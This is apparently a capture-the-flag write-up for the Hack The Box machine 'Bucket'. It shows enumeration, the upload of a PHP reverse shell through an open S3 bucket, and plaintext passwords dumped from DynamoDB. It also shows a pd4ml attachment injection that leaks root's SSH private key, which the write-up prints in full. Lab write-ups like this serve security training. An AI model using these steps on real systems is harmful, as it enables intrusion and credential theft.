Target: 10.10.10.212

## Enumeration:

nmap
```
$ sudo nmap -sC -sV 10.10.10.212

Nmap scan report for bucket.htb (10.10.10.212)
Host is up (0.032s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

checking bucket.htb

![](bucket1.png)

viewing source of bucket.htb

![](bucket2.png)

adding subdomain to /etc/hosts
```
10.10.10.212   bucket.htb s3.bucket.htb
```

gobuster
```
$ gobuster dir -u http://s3.bucket.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -z

/health               (Status: 200) [Size: 54]
/shell                (Status: 200) [Size: 0] 
/shellcode            (Status: 500) [Size: 158]
/shells               (Status: 500) [Size: 158]
/shellscripts         (Status: 500) [Size: 158]
/shellen              (Status: 500) [Size: 158]
/shellcity            (Status: 500) [Size: 158]
/shell_screenshot     (Status: 500) [Size: 158]
/shell01              (Status: 500) [Size: 158]
/shell02              (Status: 500) [Size: 158]
/shelley              (Status: 500) [Size: 158]
/shell-scripts        (Status: 500) [Size: 158]
```

checking subdomain

![](bucket3.png)

maybe something interesting

![](bucket4.png)

using awscli connect to the s3 bucket
```
$ aws --endpoint-url http://s3.bucket.htb s3 ls

2021-04-25 15:32:03 adserver

$ aws --endpoint-url http://s3.bucket.htb s3 ls s3://adserver

                           PRE images/
2021-04-25 15:34:04       5344 index.html
```

### Findings:Looking for attack vectors

S3 bucket can be accessed through aws-cli and be exploited to upload a php reverse shell and in bucket.htb/ uploaded files can be accessed. 


## Foothold:

[Payload Link](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

preparing the payload > rename to trustme.php
```
<snip>
$ip = '<ip>';  // CHANGE THIS
$port = 8888;       // CHANGE THIS
<snip>
```

```
$ aws --endpoint-url http://s3.bucket.htb s3 cp trustme.php  s3://adserver/

upload: ./trustme.php to s3://adserver/trustme.php  
```

openning a nc listener on port 8888
```
$ nc -lnvp 8888  
```

accessing uploaded file
```
$ curl http://bucket.htb/trustme.php 
```

```
$ id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


## Lateral Movement:

upgrading shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

looking for suspicious file/s
```
www-data@bucket:/home$ cd /home

www-data@bucket:/home$ ls

roy

www-data@bucket:/home$ cd roy

www-data@bucket:/home/roy$ ls

total 16
-rwxrwxr-x 1 roy roy 1040 Apr 25 14:44 cmd.sh
drwxr-xr-x 3 roy roy 4096 Sep 24  2020 project
drwxr-xr-x 3 roy roy 4096 Apr 25 23:32 snap
-r-------- 1 roy roy   33 Apr 24 20:51 user.txt

www-data@bucket:/home/roy$ cd project

www-data@bucket:/home/roy/project$ ls

total 36
-rw-rw-r--  1 roy roy    63 Sep 24  2020 composer.json
-rw-rw-r--  1 roy roy 20533 Sep 24  2020 composer.lock
-rw-r--r--  1 roy roy   367 Sep 24  2020 db.php
drwxrwxr-x 10 roy roy  4096 Sep 24  2020 vendor

www-data@bucket:/home/roy/project$ cat db.php 

<?php
require 'vendor/autoload.php';
date_default_timezone_set('America/New_York');
use Aws\DynamoDb\DynamoDbClient;
use Aws\DynamoDb\Exception\DynamoDbException;

$client = new Aws\Sdk([
    'profile' => 'default',
    'region'  => 'us-east-1',
    'version' => 'latest',
    'endpoint' => 'http://localhost:4566'
]);

$dynamodb = $client->createDynamoDb();

//todo
```

acccesing DynamoDb
```
$ aws --endpoint-url http://localhost:4566 dynamodb list-tables

{
    "TableNames": [
        "users"
    ]
}
```

dumping table users
```
$ aws --endpoint-url http://localhost:4566 dynamodb scan --table-name users 

{
    "Items": [
        {
            "password": {
                "S": "Management@#1@#"
            },
            "username": {
                "S": "Mgmt"
            }
        },
        {
            "password": {
                "S": "Welcome123!"
            },
            "username": {
                "S": "Cloudadm"
            }
        },
        {
            "password": {
                "S": "n2vM-<_K_Q:.Aa2"
            },
            "username": {
                "S": "Sysadm"
            }
        }
    ],
    "Count": 3,
    "ScannedCount": 3,
    "ConsumedCapacity": null
}             
```

trying the passwords for possible password reuse
```
www-data@bucket:/var/www$ su - roy
```

Loot:

`roy:n2vM-<_K_Q:.Aa2`


```
roy@bucket:~$ id

uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)
```

```
roy@bucket:~$ cat user.txt

<redacted>
```


## Priv Escalations:

researching what does sysadm group do

[ibm article about sysadm group](https://www.ibm.com/docs/en/db2/11.1?topic=parameters-sysadm-group-system-administration-authority-group-name)

looking for suspicious file/s
```
roy@bucket:~$ cd /var/www

roy@bucket:/var/www$ ls -la

total 16
drwxr-xr-x   4 root root 4096 Feb 10 12:29 .
drwxr-xr-x  14 root root 4096 Feb 10 12:29 ..
drwxr-x---+  4 root root 4096 Feb 10 12:29 bucket-app
drwxr-xr-x   2 root root 4096 Apr 25 23:00 html


roy@bucket:/var/www/bucket-app$ cat index.php 

<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
        if($_POST["action"]==="get_alerts") {
                date_default_timezone_set('America/New_York');
                $client = new DynamoDbClient([
                        'profile' => 'default',
                        'region'  => 'us-east-1',
                        'version' => 'latest',
                        'endpoint' => 'http://localhost:4566'
                ]);

                $iterator = $client->getIterator('Scan', array(
                        'TableName' => 'alerts',
                        'FilterExpression' => "title = :title",
                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
                ));

                foreach ($iterator as $item) {
                        $name=rand(1,10000).'.html';
                        file_put_contents('files/'.$name,$item["data"]);
                }
                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
        }
}
else
{
?>

<snip>
```

index.php explanation

creating a bash script
```
roy@bucket:~$ vim cmd.sh

#!/bin/bash
echo "Creating New Table"
echo "======================================"

# Creating New Table alerts

aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://127.0.0.1:4566

echo "======================================"
echo "Writing Data to alerts and putting in the file attacked.txt"

# Writing Data to table alerts

aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}' --endpoint-url http://127.0.0.1:4566
echo "======================================"
echo "Making Post Requests"

# Making Post Request with data "action=get_alerts"

curl -X POST -d "action=get_alerts" http://127.0.0.1:8000/index.php
echo "Done"
```

accessing file
```
roy@bucket:~$ cd /var/www/bucket-app/files

roy@bucket:/var/www/bucket-app/files$ ls

4337.html  result.pdf

roy@bucket:/var/www/bucket-app/files$ strings result.pdf

%PDF-1.4
<snip>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAx6VphKMyxurjldmb6dy1OSn0D9dumFAUCeSoICwhhsq+fadx21SU
bQr/unofKrmgNMAhjmrHCiMapmDw1dcyj4PSPtwo6IvrV0Guyu34Law1Eav9sV1hgzDLm8
9tAB7fh2JN8OB/4dt0sWxHxzWfCmHF5DBWSlxdk+K4H2vJ+eTA2FxT2teLPmJd7G9mvanh
1VtctpCOi6+CMcv1IMvdFtBLbieffTAOF1rSJds4m00MpqqwDiQdgN5ghcOubTXi3cbjz9
uCTBtXO2dcLfHAqhqYSa7eM0x5pwX54Hr9SP0qJp5y0ueraiOdoSJD5SmgBfIfCzUDZAMn
de3YGZ0Q4a86BVgsD2Vl54+9hoLOYMsiV9g4S76+PmBiuwi/Wrxtoyzr3/htJVmCpm+WfO
r4QQZyCFAVo21sLfIqMcPBqlur5FvrWtUUCA0usfx/j40V/l5WAIioIOX0XmX0kll1f6P7
1+d/BXAQNvyt/aOennafgvzsj23w5m4sOTBNOgBlAAAFiC6rIUsuqyFLAAAAB3NzaC1yc2
EAAAGBAMelaYSjMsbq45XZm+nctTkp9A/XbphQFAnkqCAsIYbKvn2ncdtUlG0K/7p6Hyq5
oDTAIY5qxwojGqZg8NXXMo+D0j7cKOiL61dBrsrt+C2sNRGr/bFdYYMwy5vPbQAe34diTf
Dgf+HbdLFsR8c1nwphxeQwVkpcXZPiuB9ryfnkwNhcU9rXiz5iXexvZr2p4dVbXLaQjouv
gjHL9SDL3RbQS24nn30wDhda0iXbOJtNDKaqsA4kHYDeYIXDrm014t3G48/bgkwbVztnXC
3xwKoamEmu3jNMeacF+eB6/Uj9KiaectLnq2ojnaEiQ+UpoAXyHws1A2QDJ3Xt2BmdEOGv
OgVYLA9lZeePvYaCzmDLIlfYOEu+vj5gYrsIv1q8baMs69/4bSVZgqZvlnzq+EEGcghQFa
NtbC3yKjHDwapbq+Rb61rVFAgNLrH8f4+NFf5eVgCIqCDl9F5l9JJZdX+j+9fnfwVwEDb8
rf2jnp52n4L87I9t8OZuLDkwTToAZQAAAAMBAAEAAAGBAJU/eid23UHJXQOsHxtwLGYkj9
i742ioDKLstib+9r1OmaNT5xDhJOhznYNpQh1tkW995lgSSOOyJH0W4VPrQVf6YtUtPsPB
vdiIOMRpq+tw3mdsnQXX2kr50myTX1gEvHP4MG4PVmqg5ZaxbONmmZNoTkjtPcTvUeF5Ts
3mhaJzuRrFwsZJ9kVXwgE7sqG8+x/F4gR1Aqs4NGtHnuO6o3gnlQwvQNKUdyRMd+dm/+VR
b1C1L1IS+59YHu5AwAfSjInayOffTWY+Jq2fu5AGpbyBk+MwuYU0vWOOccSKSk8wdiQWN/
myKP+DhCGmgo164ZlZXPQ83uVsTppVPliF3ofWUlZw1ljj7F6ysmqfnWRS66072L7Qr3Yz
cVDze568ZmdwryyVu+HDoycWqiw5zVenX18c3hq9AHuElCwRqYz/c/ZmqwOonZzQm8P8Zz
S4sLAlfrFV0frQ8TEPTeBmKCOBbKycbyvU1mPzT0Jv+BexgMF8CfxiCkDGXcx7XLIVTQAA
AMEAlZDX+sRb4BUkEYVpg2n/GV8Gvg251ZCRMfNbwERwzeZ6uf92ec05QLfTKHyhgZ8wB9
nPyPo1Kg/VEK3Q0juEjwiB0PybH9Wl2TrSquc16d2sUwWJrkqlIcTplX5WMFdwsOj0l5S3
44SjSdBcQ1FhsjUf7yTAdHHX/IDw/E9/7n8A1I38RAP6ipJYfL61Pi7KRpOruW77YBh7zE
4IoDjNCFiM4wGBjaQSvMTWkAuXC8NwOFXYNKlmNQSbqwloEt2nAAAAwQDj0IOrXsXxqZl7
fszTTPNaNB+e+Kl1XQ6EkhH48gFVRnFPLCcJcx/H5uEHBtEXRuYaPkUyVt85h4e1qN6Ib/
qBzKKVLEX+dNXdW2eCUBZw36kaXxsUQTQ4yHgdmKuHfKb/CYkLLRxksiNGJ7ihgo9cCmpG
KZs9p2b4kH/cF8+BFjI05Jr4z6XetJoRgFMwPDImGkrhQ6KbGRrHFeyxFzIW/fho72gYWi
ZhpVP0sGJN6uKIvg9p4SD6X8JBdwCtTP8AAADBAOBYuz8OdgDKw5OzZxWeBq80+n0yXUeZ
EtZFCf5z4q4laryzqyyPxUEOPTxpABbmnQjOq6clMtTnJhgAf/THSKnsGb8RABLXG/KSAh
pHoTvd81++IRB1+g6GGy0gq/j0Tp+g3e0KLtvr7ZfAtutO8bcDrLjHu6Wqyl1KoleFsv6/
lt0oT70NTv2gFGWAb6WHLEByEsnYQwk5ynbIblaApQSZEyVEPkf9LmO7AEb08lvAOS0dQ1
xMyLerif0cNjmemwAAAAtyb290QHVidW50dQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
<snip>
```

save id_rsa

```
$ chmod 600 id_rsa

$ ssh root@10.10.10.212 -i id_rsa 

root@bucket:~# id

uid=0(root) gid=0(root) groups=0(root)
```

```
root@bucket:~# cat root.txt

<redacted>
```
